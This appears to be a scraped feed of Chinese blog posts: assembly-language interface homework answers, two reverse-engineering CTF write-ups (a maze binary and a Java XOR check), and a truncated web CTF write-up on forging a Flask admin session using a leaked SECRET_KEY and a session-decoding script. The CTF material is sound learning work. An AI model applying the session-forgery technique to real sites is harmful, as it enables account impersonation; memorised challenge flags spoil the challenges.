href="#1-简述接口的概念和功能" class="headerlink" title="1.简述接口的概念和功能"></a>1.简述接口的概念和功能</h3><p>接口就是连接与外设之间的部件，它完成与外设之间的信息传送。还包括辅助工作的外围电路。</p><p>接口的功能<br>1.执行命令的功能;<br>2.返回外设状态的功能;<br>3.数据缓冲功能;<br>4.信号转换功能;<br>5.设备选择功能;<br>6.数据宽度与数据格式转换功能</p><h3 id="2-简述独立编址或统一编址的接口的区别和各自的优缺点。"><a href="#2-简述独立编址或统一编址的接口的区别和各自的优缺点。" class="headerlink" title="2.简述独立编址或统一编址的接口的区别和各自的优缺点。"></a>2.简述独立编址或统一编址的接口的区别和各自的优缺点。</h3><p>1.独立编址(专用的I&#x2F;O端口编址)—-存储器和I&#x2F;O端口在两个独立的地址空间中<br>(1)优点：I&#x2F;O端口的地址码较短，译码电路简单，存储器同I&#x2F;O端口的操作指令不同，程序比较清晰；存储器和I&#x2F;O端口的控制结构相互独立，可以分别设计<br>(2)缺点：需要有专用的I&#x2F;O指令，程序设计的灵活性较差</p><p>2.统一编址(存储器映像编址)—-存储器和I&#x2F;O端口共用统一的地址空间，当一个地址空间分配给I&#x2F;O端口以后，存储器就不能再占有这一部分的地址空间<br>(1)优点：不需要专用的I&#x2F;O指令，任何对存储器数据进行操作的指令都可用于I&#x2F;O端口的数据操作，程序设计比较灵活；由于I&#x2F;O端口的地址空间是内存空间的一部分，这样，I&#x2F;O端口的地址空间可大可小，从而使外设的数量几乎不受限制<br>(2)缺点：I&#x2F;O端口占用了内存空间的一部分，影响了系统的内存容量；访问I&#x2F;O端口也要同访问内存一样，由于内存地址较长，导致执行时间增加</p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><h3 id="3-若8253芯片的接口地址为0D0D0H-0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。"><a href="#3-若8253芯片的接口地址为0D0D0H-0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。" class="headerlink" title="3.若8253芯片的接口地址为0D0D0H~0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。"></a>3.若8253芯片的接口地址为0D0D0H~0D0D3H，时钟信号为2MHz。现利用计数器0、1、2分别产生周期为，10us的对称方波及每1ms和1s产生一个负脉冲，试画出其与系统的电路连接图，并编写包括初始化在内的程序。</h3><p>解:根据题目要求可知，计数器0 (CNTO)工作于方式3，计数器1 (CNT1) 和计数器2 (CNT2)工作于方式2。时钟频率2MHz,即周期为0.5us,从而得出各计数器的计数初值分别为:<br>CNTO:<br>    10us&#x2F;0.5us&#x3D; 20<br>CNT1:<br>    1 ms&#x2F;0.5us &#x3D; 2000<br>CNT2:<br>    1s&#x2F;0.5us&#x3D; 2 X 1000000<br>显然，计数器2的计数初值已超出了16位数的表达范围，需经过一次中间 分频，可将OUT1端的输出脉冲作为计数器2的时钟频率。这样，CNT2的计数初值就等于1s&#x2F;1ms&#x3D; 1000。线路连接如图所示。<br><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C//1.png"></p><p><strong>8253的初始化程序如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">MOV DX, 0D0D3H</span><br><span class="line">MOV AL, 16H             ;计数器0，低8位计数，方式3</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV AL, 74H             ;计数器1，双字节计数，方式2</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV AL, 0B4H            ;计数器2，双字节计数，方式2</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV DX, 0D0D0H</span><br><span class="line">MOV AL, 20              ;送计数器0的计数初值</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV DX, 0D0D1H</span><br><span class="line">MOV AX, 2000            ;送计数器1的计数初值</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV AL, AH</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV DX，0D0D2H</span><br><span class="line">MOV AX, 1000            ;送计数器2的计数初值</span><br><span class="line">OUT DX, AL</span><br><span class="line">MOV AL, AH</span><br><span class="line">OUT DX, AL</span><br></pre></td></tr></table></figure><h3 id="6-某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序-端口地址自设-。"><a href="#6-某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序-端口地址自设-。" class="headerlink" title="6.某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序(端口地址自设)。"></a>6.某系统使用8254的通道0作为计数器，计满1000时，向CPU发送中断请求，试编写初始化程序(端口地址自设)。</h3><p>解:<br>设端口地址为80H~83H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AL, 001 10000B</span><br><span class="line">OUT 83H, AL</span><br><span class="line">MOV AX, 1000</span><br><span class="line">OUT 80H, AL</span><br><span class="line">MOV AL, AH</span><br><span class="line">OUT 80H, AL</span><br></pre></td></tr></table></figure><h3 id="9-什么是波特率-假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少"><a href="#9-什么是波特率-假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少" class="headerlink" title="9.什么是波特率?假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少?"></a>9.什么是波特率?假设异步传输的一-帧信息由1位起始位、7位数据位、1位校验位和1位停止位构成，传送的波特率为9600bps，则每秒钟能传输的字符个数是多少?</h3><p>解:波特率表示每秒钟传送二进制的位数。每秒钟能传输的字符个数为9600&#x2F;10&#x3D;960</p><h3 id="16-假设8255A的端口地址为00C0H-00C6H，按下面要求编写初始化程序。"><a href="#16-假设8255A的端口地址为00C0H-00C6H，按下面要求编写初始化程序。" class="headerlink" title="16.假设8255A的端口地址为00C0H~00C6H，按下面要求编写初始化程序。"></a>16.假设8255A的端口地址为00C0H~00C6H，按下面要求编写初始化程序。</h3><p>(1)对8255A设置工作方式，A端口工作在方式1，输入; B端口工作在方式0,输出;C端口的高4位配合A端口工作，C端口的低4位为方式0，输入。<br>(2)用置0&#x2F;置1方式直接对PC6置1,对PC4置0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">答:端口地址0000 0000 1100 0000 ~0000 0000 1100 0110。说明A口地址为00C0H, B</span><br><span class="line">口地址为00C2H，C口地址为00C4H,控制字地址为00C6H。</span><br><span class="line">(1)</span><br><span class="line">控制字为: 1011X001B， 即0B1H(X取0)</span><br><span class="line">MOV AL, 0B1H</span><br><span class="line">MOV DX, 00C6H</span><br><span class="line">OUT DX, AL</span><br><span class="line">(2)</span><br><span class="line">&lt;1&gt;直接对PC6置1时的控制字为: 0XXX1101B，即0DH</span><br><span class="line">MOV AL, 0DH</span><br><span class="line">MOV DX, 00C6H</span><br><span class="line">OUT DX, AL</span><br><span class="line">&lt;2&gt;直接对PC4置0时的控制字为: 0XXX1000B，即08H</span><br><span class="line">MOV AL, 08H</span><br><span class="line">MOV DX, 00C6H</span><br><span class="line">OUT DX, AL</span><br></pre></td></tr></table></figure><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><h3 id="7-假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令"><a href="#7-假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令" class="headerlink" title="7.假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令?"></a>7.假设8259A的端口地址为92H、93H，如何用它的命令字来禁止IR3和IR5引脚上的请求，又如何撤销这一禁止命令?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">解:运用操作命令字0CW1来完成，该操作命令字是奇地址93H</span><br><span class="line">IN AL 93H</span><br><span class="line">OR AL,00101000</span><br><span class="line">OUT 93H,AL</span><br><span class="line"></span><br><span class="line">撤销:</span><br><span class="line">IN AL 93H</span><br><span class="line">AND AL,11010111</span><br><span class="line">OUT 93H,AL</span><br></pre></td></tr></table></figure><h3 id="12-DMA方式的特点是什么？DMA控制器在系统中起什么作用？"><a href="#12-DMA方式的特点是什么？DMA控制器在系统中起什么作用？" class="headerlink" title="12.DMA方式的特点是什么？DMA控制器在系统中起什么作用？"></a>12.DMA方式的特点是什么？DMA控制器在系统中起什么作用？</h3><p>利用它进行数据传送时不需要CPU的参与。每台电脑主机板上都有DMA控制器，通常计算机对其编程，并用一个适配器上的ROM(如软盘驱动控制器上的ROM)来储存程序，这些程序控制DMA传送数据。一旦控制器初始化完成，数据开始传送，DMA就可以脱离CPU，独立完成数据传送。 </p><p>DMA是直接存取方式。是在存储器与输入输出设备间直接传送数据，提高传输效率，是一种完全由硬件完成输入输出操作的方式。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
            <tag> 新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU不一样的flag</title>
      <link href="/2020/12/22/BUU%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/"/>
      <url>/2020/12/22/BUU%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
      
        <content type="html"><![CDATA[<h2 id="1-首先是32位的ida打开"><a href="#1-首先是32位的ida打开" class="headerlink" title="1.首先是32位的ida打开"></a>1.首先是32位的ida打开</h2><p>打开之后看main函数的c代码，伪代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                             <span class="comment">// //下面这些是打印到屏幕上的内容</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接受一个v5变量</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面看起来反汇编得一团糟的代码里面依稀可以看出他的目的似乎是这样的一个迷宫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure><p>限制条件为，碰到1则exit出去，从*开始，到#结束，中间必须得沿着0走，所以flag为最终走的方向所代表的数字:<br><code>flag&#123;222441144222&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java逆向解密</title>
      <link href="/2020/12/21/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/"/>
      <url>/2020/12/21/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p><strong>肚子疼，做个java逆向玩玩就不疼了</strong></p><h3 id="1-class文件逆向"><a href="#1-class文件逆向" class="headerlink" title="1.class文件逆向"></a>1.class文件逆向</h3><p>直接用JD打开之后获得源码为以下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input the flag );</span></span><br><span class="line"><span class="string">    String str = s.next();</span></span><br><span class="line"><span class="string">    System.out.println(&quot;</span>Your input is );</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">    Encrypt(stringArr);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//密钥验证之res</span></span><br><span class="line">    ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;</span><br><span class="line">      Resultlist.add(Integer.valueOf(result));</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//密钥验证之key</span></span><br><span class="line">    <span class="type">int</span>[] KEY = &#123; </span><br><span class="line">        <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">    ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; j++)</span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j])); </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Congratulations);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.err.println(&quot;</span>Error);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的逻辑，先将我们输入的内容进行简单的加密之后<code>int result = arr[i] + 64 ^ 0x20;</code>转为char与key转为char相比较，若是比较相同则true否则false。</p><p>那反过来要找输入就要进行<code>(char)(key - 64 ^ 0x20);</code>的操作了，用python解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------</span></span><br><span class="line"><span class="comment"># @Author  : M4XLMUM                                  </span></span><br><span class="line"><span class="comment"># @website : http://a16n.github.io or http://a16ne.cn </span></span><br><span class="line"><span class="comment">#-----------------------------------------------------</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">key = (<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    res = <span class="built_in">chr</span>(key[i] - <span class="number">64</span> ^ <span class="number">0x20</span>)</span><br><span class="line">    flag += res</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输出:<code>This_is_the_flag_!</code></p><p>所以flag为:<code>flag&#123;This_is_the_flag_!&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019_web</title>
      <link href="/2020/12/21/SWPU2019-web/"/>
      <url>/2020/12/21/SWPU2019-web/</url>
      
        <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>这里以前解过了，懒得找了，继续向下做了，有空回去看看</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><strong>Tag：</strong></p><p>没连上ssr，先放放</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><strong>Tag：身份伪造，flask session，</strong></p><p><a href="http://e4d2d590-f34d-4180-ab06-885ec9373a4a.node3.buuoj.cn/login">http://e4d2d590-f34d-4180-ab06-885ec9373a4a.node3.buuoj.cn/login</a></p><p>首先不用注册可以直接登录，然后点击upload显示权限不足，但是我们的用户名明明是admin啊，这里应该就是不是依照你的用户名来判断你的权限的了，然后我们拿下并瞅一瞅cookie的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE</span><br></pre></td></tr></table></figure><p>cookie里面session字段的值为<code>.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE</code>，不如尝试解一下base64试试。解不出来，是flask-session，github上有专门用于其解码和编码的工具，解码需要token，访问不存在的目录时会出现在响应头里面，直接base64解码即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</span><br><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure><p>或者没有token有有办法解出来这个session？用下面的脚本好像也行，我没试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 